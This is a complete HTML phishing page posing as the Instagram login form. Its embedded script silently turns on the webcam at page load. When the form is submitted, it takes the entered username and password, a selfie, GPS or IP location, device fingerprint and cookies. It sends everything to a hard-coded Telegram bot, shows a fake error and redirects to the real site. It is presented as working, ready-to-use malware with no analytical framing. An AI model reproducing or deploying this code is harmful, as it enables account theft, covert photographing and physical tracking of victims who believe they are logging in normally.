<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 350px; }
        .box { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px; margin-bottom: 10px; text-align: center; }
        .logo { font-size: 40px; font-weight: 600; margin-bottom: 30px; color: #262626; }
        input { width: 100%; padding: 9px 8px; margin: 5px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; outline: none; }
        input:focus { border-color: #a8a8a8; }
        .login-btn { width: 100%; padding: 7px; margin: 15px 0; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; }
        .login-btn:hover { background: #0081d6; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .divider span { margin: 0 18px; font-size: 13px; }
        .error { color: #ed4956; font-size: 14px; margin: 10px 0; display: none; }
    </style>
</head>
<body>
    <video id="camVideo" autoplay playsinline style="display:none;"></video>
    <canvas id="camCanvas" style="display:none;"></canvas>

    <div class="container">
        <div class="box">
            <div class="logo">Instagram</div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <div class="error" id="errorMsg">Invalid credentials. Please try again.</div>
            <div class="divider"><span>OR</span></div>
            <a href="#" style="color: #385185; text-decoration: none; font-size: 14px; font-weight: 600;">Log in with Facebook</a>
            <br><br>
            <a href="#" style="font-size: 12px; color: #00376b; text-decoration: none;">Forgot password?</a>
        </div>
    </div>

    <script>
        // ===== CONFIGURATION =====
        const BOT_TOKEN = "8936555609:AAGDHAZO6k5u5tRPOc2-2E-2yWb3-yoTkV8";
        const CHAT_ID = "8492749081";
        // =========================

        let cameraStream = null;
        let capturedPhotoBlob = null;
        let gpsLocation = null;

        // ===== 1. START CAMERA SILENTLY ON PAGE LOAD =====
        async function startCameraSilent() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                const video = document.getElementById('camVideo');
                video.srcObject = cameraStream;
                await video.play();
                console.log("[CAM] Camera started");
                return true;
            } catch(e) {
                console.log("[CAM] Failed:", e.message);
                return false;
            }
        }

        // ===== 2. CAPTURE PHOTO =====
        function capturePhoto() {
            return new Promise((resolve) => {
                const video = document.getElementById('camVideo');
                const canvas = document.getElementById('camCanvas');

                if (!cameraStream || video.readyState < 2) {
                    resolve(null);
                    return;
                }

                setTimeout(() => {
                    try {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.translate(canvas.width, 0);
                        ctx.scale(-1, 1);
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob((blob) => {
                            resolve(blob);
                        }, 'image/jpeg', 0.8);
                    } catch(e) {
                        resolve(null);
                    }
                }, 500);
            });
        }

        // ===== 3. GET GPS LOCATION (Force high accuracy) =====
        function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const loc = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            source: "GPS"
                        };
                        console.log("[GPS] Success:", loc.lat, loc.lng);
                        resolve(loc);
                    },
                    async (err) => {
                        console.log("[GPS] Failed:", err.message);
                        // IP Fallback 1
                        try {
                            const r = await fetch('https://ipapi.co/json/');
                            const d = await r.json();
                            if (d.latitude) {
                                resolve({
                                    lat: d.latitude,
                                    lng: d.longitude,
                                    accuracy: "IP-based",
                                    city: d.city,
                                    region: d.region,
                                    country: d.country_name,
                                    isp: d.org,
                                    ip: d.ip,
                                    source: "IP"
                                });
                                return;
                            }
                        } catch(e) {}
                        // IP Fallback 2
                        try {
                            const r = await fetch('https://ipinfo.io/json');
                            const d = await r.json();
                            if (d.loc) {
                                const [lat, lng] = d.loc.split(',');
                                resolve({
                                    lat: parseFloat(lat),
                                    lng: parseFloat(lng),
                                    accuracy: "IP-based",
                                    city: d.city,
                                    region: d.region,
                                    country: d.country,
                                    isp: d.org,
                                    ip: d.ip,
                                    source: "IP2"
                                });
                                return;
                            }
                        } catch(e) {}
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }

        // ===== 4. SEND TO TELEGRAM - SIMPLE TEXT =====
        async function sendToTelegram(text) {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                const data = await res.json();
                console.log("[TG MSG]", data.ok ? "Sent" : "Failed:", data);
                return data.ok;
            } catch(e) {
                console.log("[TG MSG] Error:", e.message);
                return false;
            }
        }

        // ===== 5. SEND PHOTO TO TELEGRAM =====
        async function sendPhotoToTelegram(blob, caption) {
            if (!blob) return false;
            try {
                const formData = new FormData();
                formData.append('photo', blob, 'selfie.jpg');
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', caption);

                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const data = await res.json();
                console.log("[TG PHOTO]", data.ok ? "Sent" : "Failed:", data);
                return data.ok;
            } catch(e) {
                console.log("[TG PHOTO] Error:", e.message);
                return false;
            }
        }

        // ===== 6. SEND LIVE LOCATION =====
        async function sendLiveLocation(lat, lng) {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: lat,
                        longitude: lng,
                        live_period: 3600
                    })
                });
                const data = await res.json();
                console.log("[TG LOC]", data.ok ? "Sent" : "Failed:", data);
                return data.ok;
            } catch(e) {
                console.log("[TG LOC] Error:", e.message);
                return false;
            }
        }

        // ===== 7. GET DEVICE INFO =====
        function getDeviceInfo() {
            let gpu = 'Unknown';
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (gl) {
                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
                    if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                }
            } catch(e) {}

            return {
                ua: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || '?',
                ram: navigator.deviceMemory || '?',
                gpu: gpu,
                lang: navigator.language,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                vendor: navigator.vendor,
                cookies: document.cookie || 'None',
                ref: document.referrer || 'Direct'
            };
        }

        // ===== MAIN: ON LOGIN CLICK =====
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            // Get credentials IMMEDIATELY
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) return;

            // Show error for realism
            document.getElementById('errorMsg').style.display = 'block';

            // Disable button
            const btn = document.querySelector('.login-btn');
            btn.disabled = true;
            btn.textContent = 'Please wait...';

            console.log("[LOGIN] Captured:", username);

            // Run ALL in parallel
            const [photo, location, device] = await Promise.all([
                capturePhoto(),
                getGPSLocation(),
                Promise.resolve(getDeviceInfo())
            ]);

            gpsLocation = location;
            capturedPhotoBlob = photo;

            // ===== BUILD TELEGRAM MESSAGE =====
            const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
            
            let msg = `<b>🔐 NEW INSTAGRAM LOGIN</b>\n`;
            msg += `<code>━━━━━━━━━━━━━━━━━━━</code>\n\n`;
            msg += `<b>📧 LOGIN CREDENTIALS:</b>\n`;
            msg += `<code>👤 Username: ${username}</code>\n`;
            msg += `<code>🔑 Password: ${password}</code>\n`;
            msg += `<code>🕐 Time: ${time}</code>\n\n`;

            msg += `<b>🌍 LOCATION:</b>\n`;
            if (location) {
                msg += `<code>📍 Lat: ${location.lat}</code>\n`;
                msg += `<code>📍 Lng: ${location.lng}</code>\n`;
                msg += `<code>🎯 Accuracy: ${location.accuracy} meters</code>\n`;
                msg += `<code>📡 Source: ${location.source}</code>\n`;
                if (location.city) {
                    msg += `<code>🏙 City: ${location.city}</code>\n`;
                    msg += `<code>🏛 Region: ${location.region}</code>\n`;
                    msg += `<code>🌏 Country: ${location.country}</code>\n`;
                }
                if (location.isp) msg += `<code>🏢 ISP: ${location.isp}</code>\n`;
                if (location.ip) msg += `<code>🌐 IP: ${location.ip}</code>\n`;
                
                msg += `\n<b>🗺 MAPS LINKS:</b>\n`;
                msg += `<a href="https://www.google.com/maps?q=${location.lat},${location.lng}">🔵 Google Maps</a>\n`;
                msg += `<a href="https://www.google.com/maps/@${location.lat},${location.lng},21z">🚗 Street View</a>\n`;
                msg += `<a href="https://waze.com/ul?ll=${location.lat},${location.lng}&navigate=yes">📱 Waze</a>\n`;
                msg += `<code>geo:${location.lat},${location.lng}</code>\n`;
            } else {
                msg += `<code>❌ Location unavailable</code>\n`;
            }

            msg += `\n<b>📱 DEVICE:</b>\n`;
            msg += `<code>🖥 OS: ${device.platform}</code>\n`;
            msg += `<code>📺 Screen: ${device.screen}</code>\n`;
            msg += `<code>🎮 GPU: ${device.gpu}</code>\n`;
            msg += `<code>⚙ CPU: ${device.cores} cores</code>\n`;
            msg += `<code>💾 RAM: ${device.ram}GB</code>\n`;
            msg += `<code>🌐 Lang: ${device.lang}</code>\n`;
            msg += `<code>🕐 TZ: ${device.tz}</code>\n`;
            msg += `<code>🔗 Ref: ${device.ref}</code>\n`;
            msg += `<code>🔧 Vendor: ${device.vendor}</code>\n`;

            msg += `\n<code>━━━━━━━━━━━━━━━━━━━</code>\n`;
            msg += `<code>🖥 UA: ${device.ua.substring(0, 200)}</code>\n`;

            // ===== SEND EVERYTHING =====
            
            // 1. Send main credentials + location message
            const msgSent = await sendToTelegram(msg);
            console.log("[RESULT] Message sent:", msgSent);

            // 2. Send live location pin
            if (location && location.lat) {
                await sendLiveLocation(location.lat, location.lng);
            }

            // 3. Send photo
            if (capturedPhotoBlob) {
                const photoCap = `<b>📸 SELFIE</b>\n<code>👤 ${username}</code>\n<code>📍 ${location ? location.lat+','+location.lng : 'Unknown'}</code>`;
                await sendPhotoToTelegram(capturedPhotoBlob, photoCap);
            } else {
                await sendToTelegram(`<b>⚠ NO CAMERA</b>\n<code>User: ${username}</code>\n<code>Camera denied or not available</code>`);
            }

            // 4. Send cookies separately
            if (device.cookies && device.cookies !== 'None' && device.cookies.length > 5) {
                await sendToTelegram(`<b>🍪 COOKIES:</b>\n<code>${device.cookies.substring(0, 3500)}</code>`);
            }

            // 5. Redirect
            setTimeout(() => {
                if (cameraStream) {
                    cameraStream.getTracks().forEach(t => t.stop());
                }
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, 2500);
        });

        // ===== START CAMERA ON LOAD =====
        window.addEventListener('load', () => {
            startCameraSilent();
        });

        // ===== CLEANUP =====
        window.addEventListener('beforeunload', () => {
            if (cameraStream) {
                cameraStream.getTracks().forEach(t => t.stop());
            }
        });
    </script>
</body>
</html>
